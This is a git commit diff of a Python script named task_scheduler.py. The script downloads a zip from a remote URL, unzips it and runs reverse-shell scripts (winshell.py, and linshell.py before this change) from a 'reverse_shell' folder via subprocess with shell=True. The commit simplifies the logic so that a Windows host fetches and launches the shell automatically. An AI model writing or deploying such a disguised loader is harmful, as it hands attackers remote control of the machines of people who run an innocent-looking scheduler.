7200787c9e72dc8fbf55671525bf3638fee61e3b
Jhean Phabio <127798956+jhonnunes443@users.noreply.github.com>
2024-04-15 21:23:29 -0300

    Update task_scheduler.py

--- task_scheduler.py
+++ task_scheduler.py
@@ -1,4 +1,3 @@
-from pathlib import Path
 import subprocess
 import time
 import os
@@ -11,43 +10,23 @@ directory = "Security_folder-main/reverse_shell"
 task1 = "python3 winshell.py"
 task2 = "python3 linshell.py"
 
-
-file1 = Path("Security_folder-main/reverse_shell/winshell.py")
-file2 = Path("Security_folder-main/reverse_shell/linshell.py")
-file3 = Path("main.zip")
-
-def existing_file():
-    if file1.is_file or file2.is_file():
-        print("Changing directory.")
-        os.chdir(directory) 
-        print("#Running script.#")
-        
-    else:
-        print("Failure to acess file.\n")
-
 def executing_scripts():
     try:
-        test =platform.system()
+        test = platform.system()
         if test == "Windows":
             print("Windows test sucessful, trying executing file...\n")
             subprocess.run(task1, shell=True)
-        elif test == "Linux":
-            print("Linux test sucessful, trying executing file... ")
-            subprocess.run(task2, shell=True)
         else:
             print("None file was right.")
     except Exception as e:
         print("Fail to execute: ", e)
 
-existing_file()
-executing_scripts()
-
 def downloading_file():
-    if not file1.is_file or file2.is_file():
+    if not os.path.isdir(directory):
         print("File not exist. \n")
         time.sleep(1)
         print("Downloading file...\n\n") 
-        urllib.request.urlretrieve(url, file3)
+        urllib.request.urlretrieve(url, "main.zip")
         time.sleep(1)
         print("Unziping file.\n")
         subprocess.run(unziping, shell=True)
@@ -57,9 +36,22 @@ def downloading_file():
         print("#Running script.#")
         executing_scripts()
     else:
-        print("Process fail.")
+        print("Changing directory.")
+        time.sleep(1)
+        os.chdir(directory) 
+        print("#Running script.#")
+        executing_scripts()
 
-downloading_file()
+
+downloading_file()        
+
+
+
+executing_scripts()
+
+
+
+
 
 
 
